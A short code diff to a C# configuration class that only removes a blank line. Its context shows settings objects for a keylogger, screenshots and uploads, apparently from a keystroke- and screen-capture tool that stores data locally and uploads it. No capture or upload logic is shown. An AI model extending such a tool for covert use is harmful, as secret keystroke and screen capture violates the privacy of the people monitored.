@@ -9,7 +9,6 @@ namespace Common.ConfigurationManager
         public string DataPath { get; set; } = System.IO.Path.Combine(
             Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
             "KSDatabase");
-
         public KeyLoggerConf KLConfig { get; set; } = new KeyLoggerConf();
         public ScreenshotConf ScrConfig { get; set; } = new ScreenshotConf();
         public UploadConf UpConfig { get; set; } = new UploadConf();
